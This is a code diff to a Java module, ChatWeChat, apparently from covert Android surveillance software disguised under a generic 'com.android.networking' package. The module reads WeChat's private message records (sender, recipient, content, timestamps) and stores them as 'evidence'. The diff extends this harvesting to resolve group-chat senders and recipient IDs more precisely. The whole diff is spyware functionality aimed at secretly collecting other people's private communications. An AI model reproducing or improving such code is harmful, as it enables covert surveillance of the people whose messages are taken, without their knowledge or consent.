@@ -30,11 +30,12 @@ import com.android.networking.file.Path;
 import com.android.networking.module.ModuleAddressBook;
 import com.android.networking.util.Check;
 import com.android.networking.util.StringUtils;
+import com.android.networking.util.Utils;
 
 public class ChatWeChat extends SubModuleChat {
 	private static final String TAG = "ChatWeChat";
 
-	private static final int PROGRAM = 0x0c;
+	private static final int PROGRAM = 0x0a;
 
 	private static final String DEFAULT_LOCAL_NUMBER = "local";
 	String pObserving = "com.tencent.mm";
@@ -199,35 +200,44 @@ public class ChatWeChat extends SubModuleChat {
 				Date date = new Date(createTime);
 				String talker = cursor.getString(1);
 				int isSend = cursor.getInt(2);
+				boolean incoming = isSend == 0;
 				String content = cursor.getString(3);
 				String nick = cursor.getString(4);
+				String from_id = talker;
+				String to_id = talker;
 
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (cursor) %s: %s(%s) %s", date, nick, talker, content);
+					Check.log(TAG + " (cursor) %s: %s(%s) %s %s", date, nick, talker, content, (incoming ? "INCOMING"
+							: "OUTGOING"));
 				}
 				String from_name, to;
 
-				boolean incoming = isSend == 0;
 				if (talker.endsWith("@chatroom")) {
+					List<String> lines = Arrays.asList(content.split("\n"));
 					if (incoming) {
-						List<String> lines = Arrays.asList(content.split("\n")[0]);
 
-						String from_id = lines.get(0).trim();
+						from_id = lines.get(0).trim();
 						from_id = from_id.substring(0, from_id.length() - 1);
-						
-						from_name = groups.getName( from_id);
-						to = myName;
 
+						from_name = groups.getName(from_id);
+						to = groups.getGroupToName(from_name, talker);
+						to_id = groups.getGroupToId(from_name, talker);
+						
+						content = StringUtils.join(lines, "", 1);
 					} else {
 						from_name = myName;
-						to = groups.getGroupTo(myName, talker);
+						from_id = myId;
+						to = groups.getGroupToName(myName, talker);
+						to_id = groups.getGroupToId(myName, talker);
 					}
 				} else {
-					from_name = incoming ? talker : myName;
-					to = incoming ? myName : talker;
+					from_name = incoming ? nick : myName;
+					from_id = incoming ? talker : myId;
+					to = incoming ? myName : nick;
+					to_id = incoming ? myId : talker;
 				}
 
-				MessageChat message = new MessageChat(PROGRAM, date, from_name, to, content, incoming);
+				MessageChat message = new MessageChat(PROGRAM, date, from_name, from_id, to, to_id, content, incoming);
 				messages.add(message);
 
 				return createTime;
@@ -261,7 +271,7 @@ public class ChatWeChat extends SubModuleChat {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (setMyAccount) %s, %s, %s", myId, myName, myPhone);
 		}
-		
+
 		ModuleAddressBook.createEvidenceLocal(ModuleAddressBook.WECHAT, myName);
 
 	}
